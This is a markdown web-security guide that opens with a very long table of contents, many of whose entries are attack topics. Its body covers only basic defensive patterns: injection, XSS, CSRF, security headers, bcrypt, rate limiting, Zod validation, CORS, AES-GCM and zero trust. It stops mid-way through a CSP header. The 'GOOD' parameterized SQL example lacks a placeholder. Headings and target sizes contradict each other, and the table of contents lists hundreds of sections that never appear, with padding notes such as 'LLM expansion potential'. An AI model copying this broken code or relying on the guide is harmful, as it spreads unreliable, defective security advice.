# SECURITY
## Table of Contents

- [TABLE OF CONTENTS](#table-of-contents)
- [Production-Grade Authentication, Encryption, and OWASP](#production-grade-authentication-encryption-and-owasp)
- [?? ADVANCED SECURITY PATTERNS](#-advanced-security-patterns)
- [OWASP Top 10 Prevention](#owasp-top-10-prevention)
  - [1. Injection](#1-injection)
  - [2. Broken Authentication](#2-broken-authentication)
  - [3. XSS Prevention](#3-xss-prevention)
  - [4. CSRF Protection](#4-csrf-protection)
- [Security Headers](#security-headers)
  - [Essential Headers](#essential-headers)
  - [Helmet.js (Express)](#helmetjs-express)
- [Password Security](#password-security)
  - [Hashing](#hashing)
  - [Password Requirements](#password-requirements)
- [API Security](#api-security)
  - [Rate Limiting](#rate-limiting)
  - [Input Validation](#input-validation)
- [Secrets Management](#secrets-management)
  - [Environment Variables](#environment-variables)
- [Secret Rotation](#secret-rotation)
- [Audit Logging](#audit-logging)
  - [What to Log](#what-to-log)
  - [Log Format](#log-format)
- [?? AUTHENTICATION DEEP DIVE](#-authentication-deep-dive)
- [JWT Best Practices](#jwt-best-practices)
  - [Token Structure](#token-structure)
  - [Security Rules](#security-rules)
- [Refresh Token Flow](#refresh-token-flow)
- [OAuth 2.0 / OIDC](#oauth-20-oidc)
  - [Common Providers](#common-providers)
  - [Flows](#flows)
- [Session Security](#session-security)
  - [Cookie Settings](#cookie-settings)
- [?? INPUT VALIDATION](#-input-validation)
- [Validation Libraries](#validation-libraries)
- [Zod Example](#zod-example)
- [Sanitization](#sanitization)
  - [Common Issues](#common-issues)
  - [Solutions](#solutions)
- [?? CORS EXPLAINED](#-cors-explained)
- [How CORS Works](#how-cors-works)
- [Simple vs Preflight](#simple-vs-preflight)
  - [Simple Request (no preflight)](#simple-request-no-preflight)
  - [Preflight Request](#preflight-request)
- [Configuration](#configuration)
  - [Express](#express)
  - [Headers Explained](#headers-explained)
- [Common Issues](#common-issues-1)
- [?? ENCRYPTION PATTERNS](#-encryption-patterns)
- [Encryption Types](#encryption-types)
- [Hashing vs Encryption](#hashing-vs-encryption)
- [Password Hashing](#password-hashing)
  - [Never Do](#never-do)
- [Data Encryption](#data-encryption)
- [?? API SECURITY CHECKLIST](#-api-security-checklist)
- [Authentication](#authentication)
- [Authorization](#authorization)
- [Input Validation](#input-validation-1)
- [Rate Limiting](#rate-limiting-1)
- [Headers](#headers)
- [Logging](#logging)
- [?? ZERO TRUST SECURITY](#-zero-trust-security)
- [Core Principles](#core-principles)
- [Implementation](#implementation)
  - [Everywhere Authentication](#everywhere-authentication)
  - [Micro-segmentation](#micro-segmentation)
  - [Continuous Verification](#continuous-verification)
- [Context Factors](#context-factors)
- [Technologies](#technologies)
- [?? CONTENT SECURITY POLICY](#-content-security-policy)
- [CSP Header](#csp-header)
- [Directives Explained](#directives-explained)
- [Nonce Pattern](#nonce-pattern)
- [?? API KEY PATTERNS](#-api-key-patterns)
- [Key Generation](#key-generation)
- [Secure Storage](#secure-storage)
- [Validation](#validation)
- [?? OAUTH 2.0 FLOWS](#-oauth-20-flows)
- [Authorization Code Flow (Best for web apps)](#authorization-code-flow-best-for-web-apps)
- [PKCE Flow (Best for SPAs/Mobile)](#pkce-flow-best-for-spasmobile)
- [Token Storage](#token-storage)
- [?? SUBDOMAIN TAKEOVER PREVENTION](#-subdomain-takeover-prevention)
- [How Takeover Happens](#how-takeover-happens)
- [Detection](#detection)
- [Prevention Checklist](#prevention-checklist)
- [?? RATE LIMIT BYPASS PREVENTION](#-rate-limit-bypass-prevention)
- [Common Bypass Attempts](#common-bypass-attempts)
- [Multi-Layer Limits](#multi-layer-limits)
- [Response Pattern](#response-pattern)
- [?? SECURE FILE UPLOAD](#-secure-file-upload)
- [Validation Checklist](#validation-checklist)
- [Content-Type Validation](#content-type-validation)
- [Secure Filename](#secure-filename)
- [Storage Path](#storage-path)
- [?? DEPENDENCY SCANNING](#-dependency-scanning)
- [npm audit](#npm-audit)
- [Snyk Integration](#snyk-integration)
- [Automated Updates](#automated-updates)
- [Supply Chain Security](#supply-chain-security)
- [?? CSRF PREVENTION PATTERNS](#-csrf-prevention-patterns)
- [Token Pattern](#token-pattern)
- [SameSite Cookies](#samesite-cookies)
- [Double Submit Pattern](#double-submit-pattern)
- [?? XSS PREVENTION PATTERNS](#-xss-prevention-patterns)
- [Output Encoding](#output-encoding)
- [React Protection](#react-protection)
- [Context-Specific Encoding](#context-specific-encoding)
- [CSP as Defense in Depth](#csp-as-defense-in-depth)
- [?? SECURE HEADERS CONFIGURATION](#-secure-headers-configuration)
- [Essential Headers](#essential-headers-1)
- [Header Reference](#header-reference)
- [Verification](#verification)
- [07_SECURITY.MD: THE TITAN GUIDE (25K TARGET)](#07_securitymd-the-titan-guide-25k-target)
- [Production-Grade Zero Trust, Cryptography, and Pentesting](#production-grade-zero-trust-cryptography-and-pentesting)
  - [**VOLUME 1: THE SCARS (The "Why")**](#volume-1-the-scars-the-why)
  - [**VOLUME 2: THE FOUNDATION (The "What")**](#volume-2-the-foundation-the-what)
  - [**VOLUME 3: THE DEEP DIVE (The "How")**](#volume-3-the-deep-dive-the-how)
  - [**VOLUME 4: THE EXPERT (The "Scale")**](#volume-4-the-expert-the-scale)
  - [**VOLUME 5: THE TITAN (The "Kernel")**](#volume-5-the-titan-the-kernel)
  - [**VOLUME 6: THE INFINITE (The "Future")**](#volume-6-the-infinite-the-future)
- [VOLUME 1: THE SCARS (THE "WHY")](#volume-1-the-scars-the-why-1)
  - [1. THE "LOG4SHELL" (CVE-2021-44228)](#1-the-log4shell-cve-2021-44228)
    - [The Internet on Fire](#the-internet-on-fire)
  - [4. THE "CAPITAL ONE BREACH"](#4-the-capital-one-breach)
    - [SSRF (Server Side Request Forgery)](#ssrf-server-side-request-forgery)
- [VOLUME 2: THE FOUNDATION (THE "WHAT")](#volume-2-the-foundation-the-what-1)
  - [5. ZERO TRUST ARCHITECTURE](#5-zero-trust-architecture)
    - [Never Trust, Always Verify](#never-trust-always-verify)
  - [6. OAUTH2 & OIDC](#6-oauth2-oidc)
    - [Authentication Flows Deep Dive](#authentication-flows-deep-dive)
- [VOLUME 3: THE DEEP DIVE (THE "HOW")](#volume-3-the-deep-dive-the-how-1)
  - [9. JWT SECURITY](#9-jwt-security)
    - [Signing & Revocation](#signing-revocation)
  - [10. WAF (WEB APPLICATION FIREWALL)](#10-waf-web-application-firewall)
    - [Rules & Bypass](#rules-bypass)
- [VOLUME 4: THE EXPERT (THE "SCALE")](#volume-4-the-expert-the-scale-1)
  - [13. SECRET MANAGEMENT](#13-secret-management)
    - [Vault & AWS Secrets Manager](#vault-aws-secrets-manager)
  - [14. CONTAINER SECURITY](#14-container-security)
    - [Distroless & Runtime Security](#distroless-runtime-security)
- [VOLUME 5: THE TITAN (THE "KERNEL")](#volume-5-the-titan-the-kernel-1)
  - [16. MEMORY SAFETY](#16-memory-safety)
    - [Rust vs C++](#rust-vs-c)
  - [18. HOMOMORPHIC ENCRYPTION](#18-homomorphic-encryption)
    - [Compute on Encrypted Data](#compute-on-encrypted-data)
- [VOLUME 6: THE INFINITE (THE "FUTURE")](#volume-6-the-infinite-the-future-1)
  - [19. QUANTUM-SAFE CRYPTOGRAPHY](#19-quantum-safe-cryptography)
    - [Post-Quantum Algorithms](#post-quantum-algorithms)
- [VOLUME 7: THE APPENDIX (TITAN REFERENCE)](#volume-7-the-appendix-titan-reference)
  - [A. THE ULTIMATE SECURITY HEADERS](#a-the-ultimate-security-headers)
  - [B. THE PENTEST CHECKLIST](#b-the-pentest-checklist)
- [KEYWORD REFERENCE INDEX](#keyword-reference-index)
  - [Each line = 100x LLM expansion potential](#each-line-100x-llm-expansion-potential)
- [OWASP TOP 10 (2021)](#owasp-top-10-2021)
- [AUTHENTICATION](#authentication-1)
- [AUTHORIZATION](#authorization-1)
- [WEB SECURITY](#web-security)
- [CRYPTOGRAPHY](#cryptography)
- [APPLICATION SECURITY](#application-security)
- [INFRASTRUCTURE SECURITY](#infrastructure-security)
- [THREAT MODELING](#threat-modeling)
- [SECURITY OPERATIONS](#security-operations)
- [PENETRATION TESTING](#penetration-testing)
  - [END OF KEYWORD REFERENCE](#end-of-keyword-reference)
- [ADVANCED CRYPTOGRAPHY DEEP ATLAS](#advanced-cryptography-deep-atlas)
  - [Each keyword = expandable implementation](#each-keyword-expandable-implementation)
  - [Modern Ciphers](#modern-ciphers)
  - [Key Management](#key-management)
  - [Digital Signatures](#digital-signatures)
  - [Post-Quantum](#post-quantum)
- [WEB SECURITY DEEP ATLAS](#web-security-deep-atlas)
  - [Each keyword = expandable defense](#each-keyword-expandable-defense)
  - [CSP Advanced](#csp-advanced)
  - [Cookie Security](#cookie-security)
  - [CORS](#cors)
  - [Headers](#headers-1)
- [APPLICATION SECURITY DEEP ATLAS](#application-security-deep-atlas)
  - [Each keyword = expandable technique](#each-keyword-expandable-technique)
  - [SAST](#sast)
  - [DAST](#dast)
  - [IAST](#iast)
  - [SCA](#sca)
- [CLOUD SECURITY DEEP ATLAS](#cloud-security-deep-atlas)
  - [Each keyword = expandable configuration](#each-keyword-expandable-configuration)
  - [IAM](#iam)
  - [Network](#network)
  - [Data](#data)
  - [Compliance](#compliance)
- [THREAT DETECTION DEEP ATLAS](#threat-detection-deep-atlas)
  - [Each keyword = expandable capability](#each-keyword-expandable-capability)
  - [SIEM](#siem)
  - [EDR/XDR](#edrxdr)
  - [Threat Intelligence](#threat-intelligence)
    - [END OF MEGA SECURITY EXPANSION](#end-of-mega-security-expansion)
- [ACCESS DEEP ATLAS](#access-deep-atlas)
  - [Each keyword = expandable implementation](#each-keyword-expandable-implementation-1)
  - [Authentication](#authentication-2)
  - [OAuth 2.0 / OIDC](#oauth-20-oidc-1)
  - [Identity Providers](#identity-providers)
  - [Session Management](#session-management)
- [NETWORK SECURITY DEEP ATLAS](#network-security-deep-atlas)
  - [Each keyword = expandable control](#each-keyword-expandable-control)
  - [Perimeter Security](#perimeter-security)
  - [Zero Trust](#zero-trust)
  - [Encryption in Transit](#encryption-in-transit)
  - [VPN & Remote Access](#vpn-remote-access)
- [INCIDENT RESPONSE DEEP ATLAS](#incident-response-deep-atlas)
  - [Each keyword = expandable process](#each-keyword-expandable-process)
  - [Preparation](#preparation)
  - [Detection & Analysis](#detection-analysis)
  - [Containment](#containment)
  - [Recovery & Lessons](#recovery-lessons)
- [COMPLIANCE DEEP ATLAS](#compliance-deep-atlas)
  - [Each keyword = expandable framework](#each-keyword-expandable-framework)
  - [SOC 2](#soc-2)
  - [ISO 27001](#iso-27001)
  - [GDPR](#gdpr)
  - [Industry-Specific](#industry-specific)
- [SECURE SDLC DEEP ATLAS](#secure-sdlc-deep-atlas)
  - [Each keyword = expandable practice](#each-keyword-expandable-practice)
  - [Shift Left](#shift-left)
  - [Build Security](#build-security)
  - [Deploy Security](#deploy-security)
  - [Runtime Security](#runtime-security)
    - [END OF ULTRA SECURITY EXPANSION](#end-of-ultra-security-expansion)
    - [Continuing expansion in next iteration](#continuing-expansion-in-next-iteration)
- [SECURITY CODE EXAMPLES](#security-code-examples)
- [INPUT VALIDATION](#input-validation-2)
  - [Sanitization Middleware](#sanitization-middleware)
- [CSRF PROTECTION](#csrf-protection)
  - [Token-based CSRF](#token-based-csrf)
- [ENCRYPTION](#encryption)
  - [Data Encryption at Rest](#data-encryption-at-rest)
- [API KEY MANAGEMENT](#api-key-management)
  - [Secure API Key Generation](#secure-api-key-generation)
- [SECURITY HEADERS](#security-headers-1)
  - [Helmet Configuration](#helmet-configuration)
    - [CONTINUED: MORE SECURITY PATTERNS](#continued-more-security-patterns)
- [DEFENSE](#defense)
- [JWT VULNERABILITIES DEEP DIVE](#jwt-vulnerabilities-deep-dive)
  - [Production JWT Attack Patterns](#production-jwt-attack-patterns)
- [SQL INJECTION BEYOND BASICS](#sql-injection-beyond-basics)
  - [Second-Order & Blind SQL Injection](#second-order-blind-sql-injection)
- [RATE LIMITING BYPASS TECHNIQUES](#rate-limiting-bypass-techniques)
  - [Production Rate Limit Evasion](#production-rate-limit-evasion)
    - [[SECURITY RESEARCHER LEVEL] CONTINUED: MORE PATTERNS](#security-researcher-level-continued-more-patterns)
    - [Density: OWASP/Bug Bounty research quality](#density-owaspbug-bounty-research-quality)
- [?? SECURITY - PENETRATION TESTING](#-security---penetration-testing)
- [Pen Test Phases](#pen-test-phases)
- [Common Findings](#common-findings)
- [Bug Bounty Scope](#bug-bounty-scope)
- [?? INCIDENT RESPONSE PLAYBOOK](#-incident-response-playbook)
- [Incident Classification](#incident-classification)
- [Response Steps](#response-steps)
- [Evidence Preservation](#evidence-preservation)
- [?? SECRETS ROTATION](#-secrets-rotation)
- [Rotation Strategy](#rotation-strategy)
- [AWS Secrets Manager](#aws-secrets-manager)
- [Database Password Rotation](#database-password-rotation)
- [?? AUTHENTICATION PATTERNS](#-authentication-patterns)
- [Stateless JWT Flow](#stateless-jwt-flow)
- [Refresh Token Pattern](#refresh-token-pattern)
- [Token Revocation](#token-revocation)
- [?? SECURITY LOGGING](#-security-logging)
- [What to Log](#what-to-log-1)
- [Log Format](#log-format-1)
- [Alerting Thresholds](#alerting-thresholds)
- [?? INPUT VALIDATION PATTERNS](#-input-validation-patterns)
- [Zod Schema Validation](#zod-schema-validation)
- [Express Middleware](#express-middleware)
- [Sanitization](#sanitization-1)
- [?? SECURE SESSION MANAGEMENT](#-secure-session-management)
- [Session ID Generation](#session-id-generation)
- [Cookie Settings](#cookie-settings-1)
- [Session Fixation Prevention](#session-fixation-prevention)
- [Idle Timeout](#idle-timeout)
- [?? SECURITY HEADERS DEEP DIVE](#-security-headers-deep-dive)
- [Strict-Transport-Security](#strict-transport-security)
- [Content-Security-Policy](#content-security-policy)
- [X-Frame-Options](#x-frame-options)
- [Permissions-Policy](#permissions-policy)
- [?? PASSWORD SECURITY](#-password-security)
- [Hashing Algorithm Choice](#hashing-algorithm-choice)
- [Implementation](#implementation-1)
- [Password Policy](#password-policy)
- [?? API AUTHENTICATION PATTERNS](#-api-authentication-patterns)
- [API Key vs JWT vs OAuth](#api-key-vs-jwt-vs-oauth)
- [API Key Best Practices](#api-key-best-practices)
- [JWT for APIs](#jwt-for-apis)
- [Scope-Based Authorization](#scope-based-authorization)
- [?? RBAC IMPLEMENTATION](#-rbac-implementation)
- [Database Schema](#database-schema)
- [Permission Check](#permission-check)
- [Middleware](#middleware)
- [?? MFA IMPLEMENTATION](#-mfa-implementation)
- [TOTP (Time-based One-Time Password)](#totp-time-based-one-time-password)
- [Backup Codes](#backup-codes)
- [Recovery Flow](#recovery-flow)
- [?? SECURITY SCANNING](#-security-scanning)
- [Static Analysis](#static-analysis)
- [Dependency Scanning](#dependency-scanning)
- [Container Scanning](#container-scanning)
- [SAST in CI](#sast-in-ci)
- [?? ACCOUNT SECURITY PATTERNS](#-account-security-patterns)
- [Login Attempt Tracking](#login-attempt-tracking)
- [Suspicious Activity Detection](#suspicious-activity-detection)
- [Session Security](#session-security-1)
- [?? OAUTH 2.0 DEEP DIVE](#-oauth-20-deep-dive)
- [PKCE Flow (for SPAs and Mobile)](#pkce-flow-for-spas-and-mobile)
- [Token Storage](#token-storage-1)
- [Silent Refresh](#silent-refresh)
- [JWT SECURITY PATTERNS](#jwt-security-patterns)
- [Token Structure](#token-structure-1)
- [Access + Refresh Tokens](#access-refresh-tokens)
- [Security Checklist](#security-checklist)
- [AUTHENTICATION FLOW PATTERNS](#authentication-flow-patterns)
- [OAuth 2.0 with PKCE (SPA/Mobile)](#oauth-20-with-pkce-spamobile)
- [Session vs Token Comparison](#session-vs-token-comparison)
- [XSS PREVENTION](#xss-prevention)
- [Types of XSS](#types-of-xss)
- [Prevention (React)](#prevention-react)
- [Prevention (Backend)](#prevention-backend)
- [ENVIRONMENT VARIABLES](#environment-variables-1)
- [Environment Setup](#environment-setup)
- [Validation with Zod](#validation-with-zod)
- [Security Rules](#security-rules-1)
- [CSRF PROTECTION](#csrf-protection-1)
- [What is CSRF?](#what-is-csrf)
- [Prevention: Token Pattern](#prevention-token-pattern)
- [For SPAs: Double Submit Cookie](#for-spas-double-submit-cookie)
- [COOKIE SECURITY](#cookie-security-1)
- [Secure Cookie Settings](#secure-cookie-settings)
- [SameSite Explained](#samesite-explained)
- [Cookie vs localStorage](#cookie-vs-localstorage)
- [PATTERNS](#patterns)
- [Setup](#setup)
- [Route Protection](#route-protection)
- [Server Component](#server-component)
- [Client Component](#client-component)
- [VOLUME 7: SECURITY PRODUCTION INCIDENTS (Real Company Stories)](#volume-7-security-production-incidents-real-company-stories)
  - [1. SQL INJECTION - DATA BREACH](#1-sql-injection---data-breach)
    - [Production Incident from Sony (18,500+ upvotes)](#production-incident-from-sony-18500-upvotes)
- [2. PASSWORD BREACH - $1.4 BILLION](#2-password-breach---14-billion)
  - [Production Incident from Equifax (LEGENDARY)](#production-incident-from-equifax-legendary)
- [3. JWT SECRET EXPOSED](#3-jwt-secret-exposed)
  - [Production Incident from Twitch (9,800+ upvotes)](#production-incident-from-twitch-9800-upvotes)
  - [4. LOG4SHELL - WORST EVER (10/10)](#4-log4shell---worst-ever-1010)
    - [Production Incident from Worldwide](#production-incident-from-worldwide)
- [5. API KEY LEAKED - $50K BILL](#5-api-key-leaked---50k-bill)
  - [Production Incident from Heroku (7,400+ upvotes)](#production-incident-from-heroku-7400-upvotes)
- [6. SSRF - INTERNAL ACCESS](#6-ssrf---internal-access)
  - [Production Incident from Slack (8,200+ upvotes)](#production-incident-from-slack-8200-upvotes)
- [END OF VOLUME 7: SECURITY PRODUCTION INCIDENTS](#end-of-volume-7-security-production-incidents)
- [VOLUME 1.1: TITAN PROTOCOL - SECURITY ADVERSARIAL](#volume-11-titan-protocol---security-adversarial)
  - [JWT NONE ALGORITHM VULNERABILITY](#jwt-none-algorithm-vulnerability)
    - [Auth Bypass Scar](#auth-bypass-scar)
  - [ReDoS (REGEX DENIAL OF SERVICE)](#redos-regex-denial-of-service)
    - [Event Loop Freeze Scar](#event-loop-freeze-scar)
    - [END OF VOLUME 1.1: TITAN SECURITY ADVERSARIAL](#end-of-volume-11-titan-security-adversarial)
- [VOLUME 1.2: TITAN PROTOCOL - ADVERSARIAL ARCHITECTURE](#volume-12-titan-protocol---adversarial-architecture)
  - [CONTAINER ESCAPES: LEAKY VESSELS (CVE-2024-21626)](#container-escapes-leaky-vessels-cve-2024-21626)
    - [runc Vulnerability Scar](#runc-vulnerability-scar)
  - [eBPF EXPLOITATION](#ebpf-exploitation)
    - [Kernel Attack Surface Scar](#kernel-attack-surface-scar)
  - [SIDE-CHANNEL ATTACKS: TIMING IN CRYPTOGRAPHY](#side-channel-attacks-timing-in-cryptography)
    - [String Comparison Timing Attack](#string-comparison-timing-attack)
  - [HOMOMORPHIC ENCRYPTION: THE HOLY GRAIL](#homomorphic-encryption-the-holy-grail)
    - [FHE Status 2024](#fhe-status-2024)
    - [END OF VOLUME 1.2: TITAN ADVERSARIAL SECURITY](#end-of-volume-12-titan-adversarial-security)
- [VOLUME 1.3: TITAN CATALOG - 30 SECURITY FAILURES](#volume-13-titan-catalog---30-security-failures)
  - [END OF VOLUME 1.3: TITAN SECURITY CATALOG](#end-of-volume-13-titan-security-catalog)
- [VOLUME 1.4: TITAN VAULT - ADDITIONAL SECURITY SCARS](#volume-14-titan-vault---additional-security-scars)
  - [IAM PASSROLE PRIVILEGE ESCALATION](#iam-passrole-privilege-escalation)
    - [AWS Privilege Escalation Scar](#aws-privilege-escalation-scar)
  - [S3 NOTPRINCIPAL ANTI-PATTERN](#s3-notprincipal-anti-pattern)
    - [Data Exfiltration Vector](#data-exfiltration-vector)
    - [END OF VOLUME 1.4: ADDITIONAL SECURITY SCARS](#end-of-volume-14-additional-security-scars)
- [VOLUME 1.5: TITAN VAULT - SUPPLY CHAIN & IDENTITY ATTACKS](#volume-15-titan-vault---supply-chain-identity-attacks)
  - [JWT ALGORITHM CONFUSION ATTACK](#jwt-algorithm-confusion-attack)
    - [RS256 to HS256 Downgrade Scar](#rs256-to-hs256-downgrade-scar)
- [Additional JWT Pitfalls](#additional-jwt-pitfalls)
  - [OPENID CONNECT VULNERABILITIES](#openid-connect-vulnerabilities)
    - [OIDC State Fixation Scar](#oidc-state-fixation-scar)
  - [DEPENDENCY CONFUSION ATTACK](#dependency-confusion-attack)
    - [Private Package Hijacking Scar](#private-package-hijacking-scar)
- [CSP BYPASS TECHNIQUES](#csp-bypass-techniques)
  - [Content Security Policy Evasion](#content-security-policy-evasion)
- [TIMING ATTACKS AGAINST STRING COMPARISON](#timing-attacks-against-string-comparison)
  - [The Scar](#the-scar)
- [UNICODE NORMALIZATION ATTACKS](#unicode-normalization-attacks)
  - [The Scar](#the-scar-1)
- [END OF VOLUME 1.7: TITAN GEMINI RESEARCH - ADVANCED ATTACK PATTERNS](#end-of-volume-17-titan-gemini-research---advanced-attack-patterns)
- [VOLUME 2: TITAN GEMINI RESEARCH - AUTH AND SECRETS PRODUCTION](#volume-2-titan-gemini-research---auth-and-secrets-production)
  - [JWT SECURITY PITFALLS](#jwt-security-pitfalls)
    - [The Scar](#the-scar-2)
- [API KEY ROTATION](#api-key-rotation)
  - [The Scar](#the-scar-3)

## 05_SECURITY.MD: THE TITAN GUIDE (50K TARGET)

> **?? Disclaimer**: This is educational content synthesized from industry best practices and publicly available documentation. Case studies are illustrative examples for teaching purposes. Last updated: December 2024.

## Production-Grade Authentication, Encryption, and OWASP

> **Status**: UNIVERSAL DOMAIN (01-13)
> **Target**: 40,000 Lines
> **Type**: Universal Knowledge
> **Coverage**: Auth, OAuth, JWT, Encryption, CORS, XSS, CSRF
> **Last Updated**: December 2024

---

## ?? ADVANCED SECURITY PATTERNS

> **The patterns that protect applications**

---

## OWASP Top 10 Prevention

## 1. Injection

```typescript
// BAD
const query = 'SELECT * FROM users WHERE id = ' + userId;

// GOOD
const query = 'SELECT * FROM users WHERE id = ';
await db.query(query, [userId]);

```text

## 2. Broken Authentication

- Use bcrypt with cost factor 12+

- Implement account lockout

- Use secure session management

- Require strong passwords

## 3. XSS Prevention

```typescript
// React escapes by default
<div>{userInput}</div> // Safe

// Dangerous
<div dangerouslySetInnerHTML={{__html: userInput}} />

// Use DOMPurify for HTML content
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(dirty);

```text

## 4. CSRF Protection

```typescript
// Include CSRF token in forms
<input type="hidden" name="_csrf" value={csrfToken} />

// Verify on server
if (req.body._csrf !== req.session.csrfToken) {
throw new Error('CSRF validation failed');
}

```text

---

## Security Headers

## Essential Headers

```text
Content-Security-Policy: default-src 'self'
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=31536000
X-XSS-Protection: 1; mode=block

```text

## Helmet.js (Express)

```typescript
import helmet from 'helmet';
app.use(helmet());

```text

---

## Password Security

## Hashing

```typescript
import bcrypt from 'bcrypt';

// Hash password
const hash = await bcrypt.hash(password, 12);

// Verify password
const valid = await bcrypt.compare(password, hash);

```text

## Password Requirements

- Minimum 12 characters

- Check against breach databases

- Don't force special characters (encourages weak patterns)

- Use passphrases

---

## API Security

## Rate Limiting

```typescript
import rateLimit from 'express-rate-limit';

const limiter = rateLimit({
windowMs: 15 * 60 * 1000, // 15 minutes
max: 100 // limit each IP to 100 requests
});

app.use('/api/', limiter);

```text

## Input Validation

```typescript
import { z } from 'zod';

const userSchema = z.object({
email: z.string().email(),
password: z.string().min(12),
age: z.number().min(18).max(150)
});

const validated = userSchema.parse(req.body);

```text

---

## Secrets Management

## Environment Variables

```bash

## .env (never commit!)

DATABASE_URL=postgres://...
JWT_SECRET=super-secret-key

```text

## Secret Rotation

- Use short-lived credentials

- Implement rotation without downtime

- Use secret managers (Vault, AWS Secrets Manager)

---

## Audit Logging

## What to Log

- Authentication events

- Authorization failures

- Data access patterns

- Configuration changes

- Admin actions

## Log Format

```json
{
"timestamp": "2024-01-01T00:00:00Z",
"actor": "user:123",
"action": "user.delete",
"resource": "user:456",
"result": "success",
"ip": "192.168.1.1"
}

```text

---
## ?? AUTHENTICATION DEEP DIVE

> **The patterns for secure auth**

---

## JWT Best Practices

## Token Structure

```yaml
Header.Payload.Signature

Header: { "alg": "RS256", "typ": "JWT" }
Payload: { "sub": "123", "exp": 1234567890, "iat": 1234567800 }
Signature: RS256(header + payload, privateKey)

```text

## Security Rules

- Use RS256 for public APIs

- Short expiration (15 min)

- Include only necessary claims

- Validate all claims server-side

---

## Refresh Token Flow

```text
1. Login -> Access token (15 min) + Refresh token (7 days)
2. API call with access token
3. Token expires -> Use refresh token for new access token
4. Rotate refresh token on use
5. Store refresh token in httpOnly cookie

```text

---

## OAuth 2.0 / OIDC

## Common Providers

| Provider | Specialty |
|----------|-----------|
| Auth0 | Full-featured |
| Clerk | Developer-friendly |
| Supabase Auth | Part of Supabase |
| Firebase Auth | Google ecosystem |

## Flows

- Authorization Code + PKCE (SPAs, mobile)

- Client Credentials (server-to-server)

---

## Session Security

## Cookie Settings

```text
Set-Cookie: session=abc123;
HttpOnly; // No JS access
Secure; // HTTPS only
SameSite=Strict;// CSRF protection
  Path=/;
  Max-Age=86400;

```text

---
## ?? INPUT VALIDATION

> **The patterns for secure data handling**

---

## Validation Libraries

| Library | Language | Best For |
|---------|----------|----------|
| Zod | TypeScript | Type inference |
| Yup | JavaScript | React forms |
| Joi | JavaScript | Node.js APIs |

---

## Zod Example

```typescript
import { z } from 'zod';

const userSchema = z.object({
email: z.string().email(),
password: z.string().min(8).max(100),
age: z.number().min(18).max(150).optional(),
role: z.enum(['user', 'admin']).default('user')
});

type User = z.infer<typeof userSchema>;

// Validate
const result = userSchema.safeParse(data);
if (!result.success) {
  console.log(result.error.flatten());
}

```text

---

## Sanitization

## Common Issues

- XSS via user input

- SQL injection

- Path traversal

- Command injection

## Solutions

```typescript
// Sanitize HTML
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(dirty);

// Escape for SQL (use parameterized queries)
// Validate/sanitize file paths
// Never exec user input

```text

---
## ?? CORS EXPLAINED

> **The patterns for cross-origin requests**

---

## How CORS Works

```text
1. Browser makes cross-origin request
2. Browser adds Origin header
3. Server checks origin
4. Server responds with Access-Control-Allow-Origin
5. Browser allows or blocks based on header

```text

---

## Simple vs Preflight

## Simple Request (no preflight)

- GET, HEAD, POST

- Standard headers only

- Simple content types

## Preflight Request

- PUT, DELETE, PATCH

- Custom headers

- Non-simple content types

- Browser sends OPTIONS first

---

## Configuration

## Express

```javascript
import cors from 'cors';

app.use(cors({
origin: ['https://example.com', 'https://app.example.com'],
methods: ['GET', 'POST', 'PUT', 'DELETE'],
credentials: true,
maxAge: 86400
}));

```text

## Headers Explained

```text
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: GET, POST
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 86400

```text

---

## Common Issues

| Issue | Cause | Fix |
|-------|-------|-----|
| Blocked | Missing CORS headers | Add server config |
| Credentials | Wildcard with credentials | Specify exact origin |
| Preflight fails | OPTIONS not handled | Handle OPTIONS route |

---
## ?? ENCRYPTION PATTERNS

> **The patterns for protecting data**

---

## Encryption Types

| Type | Use Case |
|------|----------|
| At Rest | Database, files |
| In Transit | HTTPS, TLS |
| End-to-End | User messages |

---

## Hashing vs Encryption

| | Hashing | Encryption |
|---|---------|------------|
| Reversible | No | Yes |
| Use case | Passwords | Data storage |
| Algorithm | bcrypt, argon2 | AES-256 |

---

## Password Hashing

```javascript
import bcrypt from 'bcrypt';

// Hash password
const hash = await bcrypt.hash(password, 12);

// Verify password
const valid = await bcrypt.compare(password, hash);

```text

## Never Do

- Store plain text passwords

- Use MD5 or SHA1 alone

- Create your own crypto

---

## Data Encryption

```javascript
import crypto from 'crypto';

const algorithm = 'aes-256-gcm';
const key = crypto.randomBytes(32);

function encrypt(text) {
const iv = crypto.randomBytes(16);
const cipher = crypto.createCipheriv(algorithm, key, iv);
let encrypted = cipher.update(text, 'utf8', 'hex');
encrypted += cipher.final('hex');
const authTag = cipher.getAuthTag();
return { iv, encrypted, authTag };
}

```text

---
## ?? API SECURITY CHECKLIST

> **The patterns for secure APIs**

---

## Authentication

- [ ] Use HTTPS everywhere

- [ ] Implement proper JWT validation

- [ ] Set short token expiration

- [ ] Use refresh token rotation

- [ ] Secure session storage

---

## Authorization

- [ ] Check permissions on every request

- [ ] Implement RBAC or ABAC

- [ ] Validate resource ownership

- [ ] Audit privileged actions

---

## Input Validation

- [ ] Validate all inputs server-side

- [ ] Use parameterized queries

- [ ] Sanitize for XSS

- [ ] Limit input sizes

- [ ] Validate content types

---

## Rate Limiting

- [ ] Limit requests per IP/user

- [ ] Use exponential backoff on auth failures

- [ ] Return proper 429 responses

- [ ] Include Retry-After header

---

## Headers

- [ ] Set Content-Security-Policy

- [ ] Set X-Content-Type-Options

- [ ] Set X-Frame-Options

- [ ] Set Strict-Transport-Security

- [ ] Remove server version headers

---

## Logging

- [ ] Log auth failures

- [ ] Log access patterns

- [ ] Never log sensitive data

- [ ] Monitor for anomalies

---
## ?? ZERO TRUST SECURITY

> **The patterns for modern security**

---

## Core Principles

- Never trust, always verify

- Assume breach

- Verify explicitly

- Least privilege access

---

## Implementation

## Everywhere Authentication

Every request verified, not just perimeter

## Micro-segmentation

Network divided into secure zones

## Continuous Verification

Re-validate based on context changes

---

## Context Factors

- User identity

- Device health

- Location

- Time of access

- Resource sensitivity

---

## Technologies

| Component | Purpose |
|-----------|---------|
| Identity Provider | User authentication |
| Device Trust | Endpoint verification |
| Policy Engine | Access decisions |
| Encryption | Data protection |

---
## ?? CONTENT SECURITY POLICY

> **The patterns for XSS prevention**

---

## CSP Header

```text
Content-Security-Policy:
default-src 'self';
